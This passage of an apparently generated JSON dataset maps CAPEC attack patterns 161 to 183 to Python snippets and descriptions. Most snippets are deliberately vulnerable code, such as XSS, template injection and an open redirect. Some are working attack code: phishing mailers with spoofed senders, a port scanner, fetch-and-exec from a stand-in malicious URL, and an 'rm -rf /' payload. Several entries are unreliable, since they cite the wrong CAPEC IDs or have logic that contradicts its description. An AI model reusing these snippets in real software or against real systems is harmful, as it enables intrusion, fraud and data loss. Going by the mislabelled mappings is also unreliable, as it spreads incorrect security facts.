        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/execute', methods=['POST'])\ndef execute_script():\n    script = request.form['script']\n    # Vulnerable to script injection\n    return render_template_string('<html><body><script>{{ script }}</script></body></html>', script=script)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to script injection attacks. The '/execute' endpoint accepts a POST request containing a 'script' parameter. The script is then directly embedded into an HTML template using Flask's render_template_string function without proper neutralization. This can lead to Cross-Site Scripting (XSS) attacks, where an attacker can inject malicious scripts. The code embodies the main idea of the CAPEC by showing how an API that supports scripting instructions as arguments can be exploited if proper input validation and neutralization are not implemented. The related CWEs highlight the importance of validating the origin of data (CWE-346), neutralizing scripting syntax in HTTP headers (CWE-644), and preventing XSS (CWE-79) and script injection in error messages (CWE-81) and template engines (CWE-1336)."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import socket\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef vulnerable_client(server_ip, server_port):\n    try:\n        # Create a socket object\n        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # CWE-941: Incorrectly specified destination (attacker's IP instead of legitimate server)\n        client_socket.connect((server_ip, server_port))\n        \n        # CWE-924: No integrity check on the message\n        message = \"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\"\n        client_socket.sendall(message.encode('utf-8'))\n        \n        # Receive data from the server\n        response = client_socket.recv(4096)\n        \n        # CWE-497: Exposure of sensitive system information\n        print(\"Received:\", response.decode('utf-8'))\n        \n    except Exception as e:\n        print(\"An error occurred:\", e)\n    finally:\n        client_socket.close()\n\n# Example usage\nvulnerable_client('192.168.1.100', 8080)  # Attacker's IP and port",
        "description": "This Python code snippet demonstrates a vulnerable client that connects to a server. The vulnerabilities are as follows:\n\n1. **CWE-923**: The client does not ensure it is communicating with the correct endpoint, allowing an attacker to intercept the communication.\n2. **CWE-941**: The client incorrectly specifies the destination, potentially connecting to an attacker's server instead of the legitimate one.\n3. **CWE-924**: The client does not enforce message integrity, making it possible for the message to be tampered with during transmission.\n4. **CWE-497**: The client prints the received response, potentially exposing sensitive system information to unauthorized entities.\n\nThis code embodies the main idea of CAPEC-225 (Infrastructure Manipulation) by demonstrating how an attacker can manipulate network routing to intercept and potentially alter communications between a client and a server."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/purchase', methods=['GET', 'POST'])\ndef purchase():\n    if request.method == 'POST':\n        # Vulnerable: Trusting client-side hidden field for price\n        item_price = float(request.form['price'])\n        quantity = int(request.form['quantity'])\n        total_cost = item_price * quantity\n        return f'Total cost: ${total_cost}'\n    else:\n        # Example item with hidden price field\n        return render_template_string('''\n            <form method=\"post\">\n                <input type=\"hidden\" name=\"price\" value=\"100.00\">\n                Quantity: <input type=\"text\" name=\"quantity\" value=\"1\">\n                <input type=\"submit\" value=\"Purchase\">\n            </form>\n        ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has a purchase endpoint that processes a form submission. The form includes a hidden field for the item price, which is trusted by the server when calculating the total cost. An attacker can manipulate this hidden field to alter the price, exploiting the server's reliance on client-side data. This embodies the CAPEC 'Manipulating Hidden Fields' and related CWEs, such as CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-472 (External Control of Assumed-Immutable Web Parameter)."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\n# User-specific information for spear phishing\nuser_email = 'target_user@example.com'\nuser_name = 'Target User'\ntrusted_sender_email = 'trusted_sender@example.com'\nmalicious_url = 'http://malicious-site.com/login'\n\n# Create the email content\nmessage = MIMEMultipart()\nmessage['From'] = trusted_sender_email\nmessage['To'] = user_email\nmessage['Subject'] = 'Important Update for ' + user_name\n\n# Email body with a malicious link\nbody = f\"\"\"\nDear {user_name},\n\nWe have noticed unusual activity in your account. Please click the link below to verify your account:\n\n<a href='{malicious_url}'>Verify Account</a>\n\nThank you,\nTrusted Entity\n\"\"\"\n\nmessage.attach(MIMEText(body, 'html'))\n\n# Send the email\ntry:\n    with smtplib.SMTP('smtp.example.com', 587) as server:\n        server.starttls()\n        server.login('trusted_sender@example.com', 'password')\n        server.sendmail(trusted_sender_email, user_email, message.as_string())\n        print('Spear phishing email sent successfully.')\nexcept Exception as e:\n    print(f'Failed to send email: {e}')",
        "description": "This Python code snippet demonstrates a spear phishing attack. It sends a targeted email to a specific user, appearing to come from a trusted sender. The email contains a personalized message with a malicious URL. The code leverages the CWE-601 (URL Redirection to Untrusted Site) by including a link to a malicious site, and CWE-451 (User Interface Misrepresentation of Critical Information) by spoofing the sender's email address to appear as a trusted entity. The email content is crafted to deceive the user into clicking the malicious link, which is a common tactic in spear phishing attacks."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-451: UI Misrepresentation of Critical Information\nphishing_message = \"Your account has been compromised. Please visit http://fakebank.com to secure your account.\"\n\n# CWE-290: Authentication Bypass by Spoofing\nspoofed_sender = \"security@realbank.com\"\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-308: Use of Single-factor Authentication\n\n# Function to send phishing SMS via email-to-SMS gateway\ndef send_phishing_sms(phone_number):\n    msg = MIMEText(phishing_message)\n    msg['From'] = spoofed_sender\n    msg['To'] = f\"{phone_number}@sms.gateway.com\"\n    msg['Subject'] = \"Urgent: Account Security Alert\"\n\n    try:\n        with smtplib.SMTP('smtp.mailserver.com', 587) as server:\n            server.starttls()\n            server.login('phisher@example.com', 'password')\n            server.sendmail(spoofed_sender, [msg['To']], msg.as_string())\n            print(f\"Phishing SMS sent to {phone_number}\")\n    except Exception as e:\n        print(f\"Failed to send phishing SMS: {e}\")\n\n# Example usage\nsend_phishing_sms('1234567890')",
        "description": "This Python code snippet demonstrates a mobile phishing attack by sending a phishing SMS message via an email-to-SMS gateway. The message misrepresents critical information (CWE-451) by spoofing the sender's email address (CWE-290) to appear as a legitimate source. The message contains a link to a fake website designed to steal sensitive information. The code also highlights the use of single-factor authentication (CWE-308) and the potential for brute force attacks due to improper restriction of authentication attempts (CWE-307). The use of a password system for primary authentication (CWE-309) is implied as the target for the phishing attack."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    # CWE-22: Path Traversal\n    if not file_path.startswith('/safe/directory/'): \n        raise ValueError('Invalid file path')\n\n    # CWE-73: External Control of File Name or Path\n    with open(file_path, 'r') as file:\n        content = file.read()\n\n    # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n    if file_path.endswith('.txt'):\n        process_text_file(content)\n    elif file_path.endswith('.jpg'):\n        process_image_file(content)\n    else:\n        raise ValueError('Unsupported file type')\n\n    # CWE-377: Insecure Temporary File\n    temp_file_path = '/tmp/tempfile'\n    with open(temp_file_path, 'w') as temp_file:\n        temp_file.write(content)\n\n    # CWE-99: Improper Control of Resource Identifiers\n    os.system(f'cat {temp_file_path}')\n\n\ndef process_text_file(content):\n    print('Processing text file')\n\n\ndef process_image_file(content):\n    print('Processing image file')\n\n# Example usage\nuser_input_path = input('Enter the file path: ')\nprocess_file(user_input_path)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to file manipulation as described in the CAPEC. The `process_file` function takes a file path as input and performs various operations on the file. The code includes the following vulnerabilities:\n\n1. **CWE-22: Path Traversal** - The code checks if the file path starts with a safe directory but does not properly neutralize special elements, potentially allowing path traversal attacks.\n2. **CWE-73: External Control of File Name or Path** - The file path is controlled by user input, which can lead to unauthorized file access.\n3. **CWE-646: Reliance on File Name or Extension of Externally-Supplied File** - The code relies on the file extension to determine how to process the file, which can be exploited by an attacker to misclassify the file.\n4. **CWE-377: Insecure Temporary File** - The code creates a temporary file in a predictable location (`/tmp/tempfile`), which can be exploited by an attacker.\n5. **CWE-99: Improper Control of Resource Identifiers** - The code uses `os.system` to execute a command with the temporary file path, which can be manipulated by an attacker to execute arbitrary commands.\n\nOverall, this code snippet embodies the main idea of the CAPEC by demonstrating how file manipulation can lead to various security vulnerabilities."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "class SystemConfig:\n    def __init__(self):\n        self.config = {'setting1': 'default1', 'setting2': 'default2'}\n        self.authenticated = False\n\n    def reset_config(self):\n        if not self.authenticated:\n            self.config = {'setting1': 'default1', 'setting2': 'default2'}\n            print('Configuration reset to default values.')\n        else:\n            print('Unauthorized reset attempt.')\n\n    def authenticate(self, password):\n        if password == 'correct_password':\n            self.authenticated = True\n            print('Authenticated successfully.')\n        else:\n            print('Authentication failed.')\n\n# Example usage\nsystem = SystemConfig()\nsystem.reset_config()  # Resets configuration without authentication\nsystem.authenticate('wrong_password')\nsystem.reset_config()  # Still resets configuration without proper authentication",
        "description": "This Python code snippet defines a `SystemConfig` class that simulates a system configuration with a reset function. The `reset_config` method resets the configuration to default values without requiring authentication, embodying the CAPEC idea of forcing the system to reset values. The `authenticate` method is provided to simulate an authentication mechanism, but it is not used to protect the reset function, illustrating CWE-306 (Missing Authentication for Critical Function). The code demonstrates how an attacker could exploit the lack of authentication to reset the system configuration to a previous state, potentially leveraging weaknesses in the system's prior configuration."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import os\nimport logging\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = 'Sensitive Trace Data'\ntrace_file_path = '/tmp/trace_data.log'\n\n# Storing sensitive trace data in an unprotected location\nwith open(trace_file_path, 'w') as trace_file:\n    trace_file.write(trace_data)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nlogging.basicConfig(filename='/tmp/system_info.log', level=logging.DEBUG)\nlogging.debug('Sensitive system information')\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Simulating activation of debug logic\nos.system('echo 1 > /proc/sys/kernel/debug')\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Simulating a security-critical function that might be optimized away\nsecurity_critical = True\nif security_critical:\n    print('Security-critical operation')\nelse:\n    pass  # This branch might be optimized away\n\n# CWE-506: Embedded Malicious Code\n# Simulating embedded malicious code\nmalicious_code = lambda: os.system('rm -rf /')\n# Uncommenting the next line would execute the malicious code\n# malicious_code()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'White Box Reverse Engineering' and its associated CWEs. The code includes:\n\n1. **CWE-1323**: Sensitive trace data is stored in an unprotected location (`/tmp/trace_data.log`).\n2. **CWE-497**: Sensitive system information is logged to a file (`/tmp/system_info.log`) that could be accessed by unauthorized users.\n3. **CWE-1313**: Simulates the activation of debug logic at runtime, which could alter the system's behavior (`echo 1 > /proc/sys/kernel/debug`).\n4. **CWE-1037**: A security-critical operation that might be optimized away by the processor, potentially removing the security mechanism.\n5. **CWE-506**: Contains a lambda function representing embedded malicious code that, if executed, would delete all files (`rm -rf /`).\n\nThe code illustrates how an attacker could use white box reverse engineering techniques to discover and exploit these vulnerabilities."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import os\n\n# Create a file with an alternate data stream\nfile_path = 'example.txt'\nads_path = file_path + ':hidden_stream'\n\n# Write data to the main file\nwith open(file_path, 'w') as f:\n    f.write('This is the main file content.')\n\n# Write data to the alternate data stream\nwith open(ads_path, 'w') as f:\n    f.write('This is hidden content in ADS.')\n\n# Check if the ADS exists (this will not show ADS)\nif os.path.exists(file_path):\n    print(f'{file_path} exists.')\n\n# Attempt to read the ADS (this will not be detected by normal utilities)\ntry:\n    with open(ads_path, 'r') as f:\n        hidden_content = f.read()\n        print(f'Hidden content: {hidden_content}')\nexcept FileNotFoundError:\n    print('ADS not found.')",
        "description": "This Python code snippet demonstrates the creation and usage of an NTFS Alternate Data Stream (ADS) on a Windows system. The main file 'example.txt' is created with some content, and an ADS named 'hidden_stream' is attached to it, containing hidden content. The code then checks for the existence of the main file and attempts to read the hidden content from the ADS. This illustrates how ADS can be used to hide data from normal system utilities, aligning with the CAPEC description. The related CWEs are represented by the improper handling and detection of ADS, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import socket\n\n# Function to perform footprinting by probing open ports\ndef footprinting(target_ip):\n    open_ports = []\n    for port in range(1, 1025):  # Scanning first 1024 ports\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target_ip, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    open_ports = footprinting(target_ip)\n    print(f'Open ports on {target_ip}: {open_ports}')",
        "description": "This Python code snippet demonstrates a basic footprinting technique by scanning a target IP address for open ports. The function 'footprinting' iterates over a range of ports (1-1024) and attempts to establish a connection to each port. If a connection is successful, the port is considered open and is added to the 'open_ports' list. This activity can help an adversary identify services running on the target system. The code embodies the CAPEC concept of probing and exploration to identify constituents and properties of the target. Additionally, it indirectly touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing open ports and services to an unauthorized actor."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "import requests\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nurl = 'http://example.com/login?username=admin&password=secret'\nresponse = requests.get(url)\n\n# CWE-209: Generation of Error Message Containing Sensitive Information\nif response.status_code != 200:\n    print(f'Error: {response.status_code} - {response.text}')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nserver_info = response.headers.get('Server')\nif server_info:\n    print(f'Server Information: {server_info}')\n\n# CWE-1125: Excessive Attack Surface\n# Simulating multiple endpoints to increase attack surface\nendpoints = ['/admin', '/config', '/debug', '/status']\nfor endpoint in endpoints:\n    response = requests.get(f'http://example.com{endpoint}')\n    print(f'Endpoint {endpoint} response: {response.status_code}')\n\n# CWE-494: Download of Code Without Integrity Check\ncode_url = 'http://example.com/malicious_code.py'\nmalicious_code = requests.get(code_url).text\nexec(malicious_code)",
        "description": "This Python code snippet demonstrates a web application fingerprinting attack by sending a series of probes to a web application to gather information. It uses the HTTP GET method with sensitive query strings (CWE-598) to simulate a login request. If an error occurs, it prints the error message containing potentially sensitive information (CWE-209). It also retrieves and prints server information from the response headers (CWE-497). The code then simulates probing multiple endpoints to increase the attack surface (CWE-1125). Finally, it downloads and executes code from a remote location without verifying its integrity (CWE-494). This code embodies the main idea of CAPEC-170 by gathering version-dependent and type-dependent behavior to identify the target and potentially pave the way for more damaging attacks."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "user_input = input('Enter variable name: ')\n\n# CWE-627: Dynamic Variable Evaluation\nexec(f'{user_input} = 42')\n\n# CWE-95: Eval Injection\nexec(f'print({user_input})')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-77: Manipulating User-Controlled Variables. The code takes user input to dynamically create and manipulate a variable name using the 'exec' function. This is an example of CWE-627 (Dynamic Variable Evaluation) and CWE-95 (Eval Injection). The 'exec' function executes the input as code, allowing an attacker to inject arbitrary code. This can lead to unauthorized access or modification of variables and functions, representing the core idea of variable manipulation vulnerabilities."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    # CWE-451: UI Misrepresentation of Critical Information\n    # The user thinks they are submitting a harmless form, but it actually triggers a download\n    if 'query' in request.form:\n        return 'Query submitted!'\n    else:\n        # CWE-290: Authentication Bypass by Spoofing\n        # CWE-941: Incorrectly Specified Destination in a Communication Channel\n        # CWE-925: Improper Verification of Intent by Broadcast Receiver\n        # CWE-618: Exposed Unsafe ActiveX Method\n        return 'Downloading malicious software...'\n\n@app.route('/')\ndef index():\n    # Misleading UI: The button appears to submit a query but actually triggers a download\n    return render_template_string('''\n        <form action=\"/submit\" method=\"post\">\n            <input type=\"hidden\" name=\"query\" value=\"harmless_query\">\n            <button type=\"submit\">Submit Query</button>\n        </form>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates the concept of Action Spoofing. The main idea is to trick the user into thinking they are performing a harmless action (submitting a query) when in fact they are initiating a different, potentially harmful action (downloading malicious software). The code includes a form that appears to submit a query, but depending on the form data, it may trigger a download instead. This embodies the CAPEC concept of disguising one action for another. The related CWEs are represented in the code by the misleading UI (CWE-451), potential for authentication bypass (CWE-290), incorrect destination specification (CWE-941), improper intent verification (CWE-925), and unsafe method exposure (CWE-618)."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/flash', methods=['GET'])\ndef flash_injection():\n    # CWE-434: Unrestricted Upload of File with Dangerous Type\n    flash_file = request.args.get('flash_file')\n    if not flash_file.endswith('.swf'):\n        return 'Invalid file type', 400\n\n    # CWE-88: Improper Neutralization of Argument Delimiters in a Command\n    # CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n    flash_params = request.args.get('params')\n    template = f\"<embed src='{flash_file}' flashvars='{flash_params}'></embed>\"\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has an endpoint '/flash' that accepts user input to embed a Flash file within an HTML document. The code is vulnerable to Flash Parameter Injection (CAPEC-139) due to improper data validation and neutralization. Specifically, it allows unrestricted upload of files (CWE-434) and does not properly neutralize special elements in the template engine (CWE-1336). An attacker can exploit these weaknesses to inject malicious parameters into the Flash file, potentially leading to cross-domain policy violations (CWE-942) and other security issues."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import requests\n\n# Vulnerable function that includes code from an external source\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n\ndef include_remote_code(url):\n    try:\n        # Fetch the remote code (CWE-829)\n        response = requests.get(url)\n        response.raise_for_status()\n        remote_code = response.text\n\n        # Execute the remote code (CWE-94, CWE-506)\n        exec(remote_code)  # CWE-94: Code Injection\n    except requests.RequestException as e:\n        print(f\"Failed to fetch remote code: {e}\")\n    except Exception as e:\n        print(f\"Error executing remote code: {e}\")\n\n# Example usage\ninclude_remote_code('http://example.com/malicious_code.py')",
        "description": "This Python code snippet demonstrates a vulnerable function that includes and executes code from an external source, embodying the main idea of the CAPEC 'Code Inclusion'. The function 'include_remote_code' takes a URL as input, fetches the code from the URL, and executes it using the 'exec' function. This represents CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it imports code from an external source. It also touches on CWE-94 (Code Injection) and CWE-506 (Embedded Malicious Code) by executing the fetched code without proper validation. The use of 'exec' to run the fetched code highlights CWE-913 (Improper Control of Dynamically-Managed Code Resources). This code is vulnerable to remote code execution attacks, as it does not validate or sanitize the fetched code before execution."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import os\n\n# Vulnerable configuration file path\nconfig_file_path = '/etc/myapp/config.ini'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to write configuration\ndef write_config(file_path, data):\n    with open(file_path, 'w') as file:\n        file.write(data)\n\n# Simulate an attacker modifying the configuration file\nattacker_data = '[Settings]\\nDebugMode=True\\n'\nwrite_config(config_file_path, attacker_data)\n\n# Application reads the modified configuration\nconfig_data = read_config(config_file_path)\nprint('Configuration Data:', config_data)\n\n# Application behavior changes based on the modified configuration\nif 'DebugMode=True' in config_data:\n    print('Debug mode enabled, security checks bypassed!')",
        "description": "This Python code snippet demonstrates a configuration/environment manipulation attack. The code simulates an attacker modifying an external configuration file used by an application. The attacker writes a new configuration that enables a debug mode, which could bypass security checks. The application then reads the modified configuration and changes its behavior based on the new settings. This example embodies the main idea of CAPEC-15 (Configuration/Environment Manipulation) and highlights CWE-15 (External Control of System or Configuration Setting) by showing how an external configuration file can be manipulated to alter the application's behavior."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import os\n\n# Simulate a protected directory and file\nprotected_dir = '/protected'\nprotected_file = 'config.cfg'\n\n# Simulate an attacker creating a file with the same name in a different directory\nattacker_dir = '/tmp'\nattacker_file_path = os.path.join(attacker_dir, protected_file)\n\n# Create the attacker's file\nwith open(attacker_file_path, 'w') as f:\n    f.write('malicious content')\n\n# Vulnerable function that loads the file based on name only\n# It searches /tmp before /protected\nsearch_dirs = ['/tmp', '/protected']\n\nfor directory in search_dirs:\n    file_path = os.path.join(directory, protected_file)\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as f:\n            content = f.read()\n        print(f'Loaded content from {file_path}: {content}')\n        break",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can create a file with the same name as a protected file in a different directory. The vulnerable function searches directories in a specific order and loads the first file it finds with the given name. In this case, the attacker's file in '/tmp' is loaded before the legitimate file in '/protected'. This represents the CAPEC idea of exploiting file location algorithms by creating files with the same name as protected files. The related CWEs provide additional context, such as reliance on file names and external control of file paths."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "from flask import Flask, request, redirect, make_response\n\napp = Flask(__name__)\n\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    if target_url:\n        return redirect(target_url)\n    return 'No URL provided', 400\n\n@app.route('/flash')\ndef flash_vulnerability():\n    flash_url = request.args.get('flash_url')\n    if flash_url:\n        response = make_response(f'<object type=\"application/x-shockwave-flash\" data=\"{flash_url}\"></object>')\n        response.headers['Content-Type'] = 'text/html'\n        return response\n    return 'No Flash URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to demonstrate vulnerabilities related to Cross-Site Flashing and associated CWEs. The '/redirect' route represents an open redirect vulnerability (CWE-601), where user input is directly used to redirect the user to an external URL without validation. The '/flash' route demonstrates a Cross-Site Flashing vulnerability, where user input is used to embed a Flash object with a URL specified by the attacker. This can lead to the execution of malicious Flash content. The code highlights the risks of accepting and using user-controlled input without proper validation or sanitization, which can lead to security issues such as phishing, cross-site scripting, and improper handling of HTTP headers."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "from flask import Flask, request, jsonify, make_response\nimport json\n\napp = Flask(__name__)\n\n# Simulated micro-service endpoint\n@app.route('/api/userinfo', methods=['GET'])\ndef user_info():\n    # CWE-598: Using GET request with sensitive query strings\n    user_id = request.args.get('user_id')\n    if not user_id:\n        return make_response(jsonify({'error': 'User ID is required'}), 400)\n\n    # Simulated sensitive data\n    user_data = {\n        '1': {'name': 'John Doe', 'email': 'john.doe@example.com'},\n        '2': {'name': 'Jane Smith', 'email': 'jane.smith@example.com'}\n    }\n\n    # CWE-219: Storing sensitive data under web root\n    if user_id in user_data:\n        return jsonify(user_data[user_id])\n    else:\n        return make_response(jsonify({'error': 'User not found'}), 404)\n\n# CWE-539: Using persistent cookies with sensitive information\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.get_json()\n    username = data.get('username')\n    password = data.get('password')\n\n    # Simulated authentication\n    if username == 'admin' and password == 'password':\n        resp = make_response(jsonify({'message': 'Login successful'}))\n        resp.set_cookie('session_id', '123456789', max_age=60*60*24*30)  # Persistent cookie\n        return resp\n    else:\n        return make_response(jsonify({'error': 'Invalid credentials'}), 401)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask framework to create a simple web application with two endpoints: '/api/userinfo' and '/login'. The '/api/userinfo' endpoint demonstrates CWE-598 by using a GET request with a sensitive query string to retrieve user information. It also illustrates CWE-219 by potentially exposing sensitive user data stored under the web root. The '/login' endpoint demonstrates CWE-539 by setting a persistent cookie containing sensitive session information upon successful login. This code embodies the main idea of the CAPEC by exposing micro-services directly, making them vulnerable to exploitation through the identified weaknesses."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# Sensitive file with incorrect permissions\nsensitive_file = '/etc/sensitive_data.txt'\nos.chmod(sensitive_file, 0o777)  # Incorrectly setting permissions to be world-readable and writable\n\n# CWE-1220: Insufficient Granularity of Access Control\n# Function to check access control, but with insufficient granularity\nuser_roles = {'admin': ['read', 'write', 'delete'], 'user': ['read']}\n\ndef check_access(user_role, action):\n    if action in user_roles.get(user_role, []):\n        return True\n    return False\n\n# CWE-1280: Access Control Check Implemented After Asset is Accessed\n# Function to read sensitive data without proper access control\n\ndef read_sensitive_data(user_role):\n    data = None\n    if os.path.exists(sensitive_file):\n        with open(sensitive_file, 'r') as file:\n            data = file.read()  # Accessing the file before checking access control\n    if check_access(user_role, 'read'):\n        return data\n    else:\n        return 'Access Denied'\n\n# Example usage\nuser_role = 'user'\nprint(read_sensitive_data(user_role))",
        "description": "This Python code snippet demonstrates a scenario where an attacker can exploit incorrectly configured access control security levels. The code includes three main weaknesses:\n\n1. **CWE-732: Incorrect Permission Assignment for Critical Resource** - The sensitive file '/etc/sensitive_data.txt' is assigned permissions that allow it to be read and modified by any user (world-readable and writable).\n\n2. **CWE-1220: Insufficient Granularity of Access Control** - The `check_access` function uses a simple role-based access control mechanism that lacks granularity, potentially allowing unauthorized actions.\n\n3. **CWE-1280: Access Control Check Implemented After Asset is Accessed** - The `read_sensitive_data` function reads the sensitive file before performing an access control check, allowing unauthorized access to the data.\n\nThis code snippet embodies the main idea of the CAPEC by illustrating how an attacker can exploit misconfigured access controls to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <body>\n        <h1>Welcome to the vulnerable site</h1>\n        <iframe src=\"https://trusted-site.com\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2;\"></iframe>\n        <div style=\"position:absolute;top:0;left:0;width:100%;height:100%;z-index:1;\">\n            <button onclick=\"alert('Clicked!')\">Click Me!</button>\n        </div>\n    </body>\n    </html>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates a clickjacking attack using a transparent overlay. The main idea of the CAPEC is represented by embedding an iframe with a trusted site (https://trusted-site.com) and setting its opacity to 0, making it invisible. The iframe is positioned on top of the main content, intercepting user actions. The button in the main content is a decoy, and any clicks on it will actually be intercepted by the invisible iframe. This demonstrates CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by allowing the iframe to overlay the main content. The code also implicitly touches on CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) by embedding content from another domain without proper restrictions."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/load_flash', methods=['GET'])\ndef load_flash():\n    flash_url = request.args.get('flash_url')\n    if not flash_url:\n        return 'No flash URL provided', 400\n    # CWE-20: Improper Input Validation\n    if 'http' not in flash_url:\n        return 'Invalid URL', 400\n    # CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n    if 'trusted.com' not in flash_url:\n        return 'Untrusted domain', 403\n    # CWE-506: Embedded Malicious Code\n    response = requests.get(flash_url)\n    if response.status_code != 200:\n        return 'Failed to load flash content', 500\n    # CWE-184: Incomplete List of Disallowed Inputs\n    if '<script>' in response.text:\n        return 'Malicious content detected', 400\n    # CWE-697: Incorrect Comparison\n    if response.text == 'safe_content':\n        return 'Safe content loaded'\n    return render_template_string(response.text)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application that loads Flash content from a user-specified URL. The main idea of the CAPEC (Flash Injection) is demonstrated by allowing an attacker to trick the application into loading malicious Flash content. The code includes several CWE-related weaknesses: CWE-20 (Improper Input Validation) by not thoroughly validating the 'flash_url' parameter, CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) by allowing URLs from untrusted domains, CWE-506 (Embedded Malicious Code) by potentially loading and executing malicious content, CWE-184 (Incomplete List of Disallowed Inputs) by not having a comprehensive list of disallowed inputs, and CWE-697 (Incorrect Comparison) by incorrectly comparing the response content. This combination of weaknesses can lead to the execution of malicious Flash content specified by an attacker."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
